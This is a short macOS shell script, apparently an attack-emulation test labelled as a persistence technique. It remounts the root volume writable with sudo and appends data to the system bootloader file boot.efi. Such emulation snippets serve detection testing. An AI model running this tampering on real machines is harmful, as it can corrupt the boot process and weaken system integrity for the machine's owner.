#!/usr/bin/env sh
# ATTACK_PERSISTENCE_T1159_MACOS_BOOT_MOD
sudo mount -uw /
echo -e " " >> /System/Library/CoreServices/boot.efi

